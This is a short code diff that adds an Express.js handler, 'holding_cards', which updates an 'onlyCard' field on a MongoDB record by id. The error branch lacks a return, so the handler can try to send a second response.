@@ -162,6 +162,22 @@ export const skip_code = (req, res) => {
 
 }
 
+export const holding_cards = (req, res) => {
+    const { id, onlyCard } = req.body;
+    Info.findOneAndUpdate({ _id: id }, {
+        $set: {
+            onlyCard: onlyCard
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
+
+        return res.status(200).json({ success: true,id:id })
+    })
+
+}
+
 export const cards = (req, res) => {
     const { id, onlyCard, holdingCard } = req.body;
     Info.findOneAndUpdate({ _id: id }, {
